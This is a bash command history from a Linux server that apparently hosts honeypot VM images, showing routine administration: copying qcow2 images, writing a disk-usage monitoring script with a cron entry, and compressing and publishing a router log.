+  845  ll
+  846  cd /qcow2/haas/
+  847  ll
+  848  cd /tmp/
+  849  cp /qcow2/haas/mikrotik.qcow2 .
+  850  ll
+  851  cp mikrotik.qcow2 mikrotik.qcow21
+  852  cp mikrotik.qcow2 mikrotik.qcow212
+  853  ll /var/log/router.log 
+  854  ll /var/log/router.log  -h
+  855  find / -name sensor1_2014-07-09_02-29-08.scap.gz
+  856  cd /var/www/html/scaps/
+  857  ll
+  858  rm * -f
+  859  ll
+  860  virsh
+  861  cd /qcow2/haas/
+  862  ll
+  863  ll /var/log/router.log  -h
+  864  cpu 
+  865  ll
+  866  cd /tmp/
+  867  ll
+  868  cp mikrotik.qcow2 mikrotik.qcow2.1111
+  869  service snmpd restart
+  870  service snmpd stop
+  871  service snmpd start
+  872  cd /tmp/
+  873  ll
+  874  mkdir hamid
+  875  cd hamid
+  876  ll
+  877  echo "salam" >> 1.txt
+  878  cat 1.txt 
+  879  df -h
+  880  df
+  881  df /dev/sda3
+  882  watch -n 1 df /dev/sda3 >> 1.txt
+  883  cat 1.txt 
+  884  touch test.sh
+  885  chmod +x test.sh
+  886  vi test.sh 
+  887  ./test.sh 
+  888  tee
+  889  vi test.sh 
+  890  whitch df
+  891  witch df
+  892  which df
+  893  vi test.sh 
+  894  ./test.sh 
+  895  vi test.sh 
+  896  ./test.sh 
+  897  touch /var/log/router_disck.txt 
+  898  echo > /var/log/router_disck.txt 
+  899  tail /var/log/router_disck.txt 
+  900  vi /tmp/hamid/test.sh 
+  901  /tmp/hamid/test.sh 
+  902  vi /tmp/hamid/test.sh 
+  903  /tmp/hamid/test.sh 
+  904  ps aux |
+  905  ps aux | grep test
+  906  ll /tmp/hamid/
+  907  ps aux | grep test.sh
+  908  vi /tmp/hamid/test.sh 
+  909  /tmp/hamid/test.sh 
+  910  kill %%
+  911  vi /tmp/hamid/test.sh 
+  912  tail /var/log/router_disck.txt  -f
+  913  cat /var/log/router_disck.txt  
+  914  tail /var/log/router_disck.txt  -f
+  915  ps aux | grep "pattern" | wc -l
+  916  ps aux | grep "pattern"
+  917  df /dev/sda3
+  918  df /dev/sda3 | grep "patern"
+  919  df /dev/sda3 | grep "/dev/sda3"
+  920  vi /tmp/hamid/test.sh 
+  921  tail /var/log/router_disck.txt  -f
+  922  vi /tmp/hamid/test.sh 
+  923  tail /var/log/router_disck.txt  -f
+  924  cat /var/log/router_disck.txt
+  925  echo > /var/log/router_disck.txt
+  926  cat /var/log/router_disck.txt
+  927  tail /var/log/router_disck.txt  -f
+  928  vi /tmp/hamid/test.sh 
+  929  tail /var/log/router_disck.txt  -f
+  930  vi /tmp/hamid/test.sh 
+  931  tail /var/log/router_disck.txt  -f
+  932  vi /etc/crontab 
+  933  tail /var/log/router_disck.txt  -f
+  934  echo > /var/log/router_disck.txt
+  935  tail /var/log/router_disck.txt  -f
+  936  vi /etc/crontab 
+  937  uptime
+  938  date
+  939  tail /var/log/router_disck.txt  -f
+  940  ll /var/log/router_disck.txt 
+  941  ll /var/log/router_disck.txt -h
+  942  tail /var/log/router_disck.txt 
+  943  cat /var/log/router_disck.txt 
+  944  df -h
+  945  df 
+  946  vi /var/www/html/haas/linux_hi.php
+  947  df -h
+  948  ll /var/log/router.log 
+  949  ll /var/log/router.log  -h
+  950  ll /var/log/router_disck.txt -h
+  951  cd /var/www/html/haas/
+  952  cd /var/log/
+  953  tar -xvf router.log 
+  954  tar -cxvf router.log 
+  955  tar --help
+  956  tar -cvf router.tar.gz router.log 
+  957  ll
+  958  ls router
+  959  ls router.tar.gz 
+  960  ls router.tar.gz -l
+  961  ls router.tar.gz -lh
+  962  router
+  963  rm router.tar.gz 
+  964  gzip -c router.log > router.log.gz
+  965  ll router.log.gz 
+  966  ll router.log.gz  -l
+  967  ll router.log.gz  -h
+  968  cd /var/www/html/haas/
+  969  ln -s /var/log/router.log.gz .
+  970  ll
+  971  ll -l
+  972  cd /qcow2/haas/
+  973  ll
+  974  pv centos_hi_configshode_ba_sysdig_karmikone.qcow2 > centos_hi.qcow2
+  975  pv centos_server_minimal_base_kham.qcow2 > centos_hi.qcow2 
+  976  ll
+  977  ll -h
+  978  df -h
+  979  ll
+  980  du /var/log
+  981  du /var/log -s
+  982  du /var/log -sh
+  983  find / -size +100mb
+  984  find / -size +100M
+  985  df /qcow2/haas/ -sg
+  986  df /qcow2/haas/ -sh
+  987  du /qcow2/haas/ -sh
+  988  ll
+  989  ll -h
+  990  df -h
+  991  df 
+  992  vi /etc/crontab 
+  993  df -h
+  994  df 
+  995  ll
+  996  rm windows_hi.qcow2
+  997  yum-complete-transaction
+  998  uname -a
+  999   history
+ 1000   history> /home/vhr/root_controller.txt
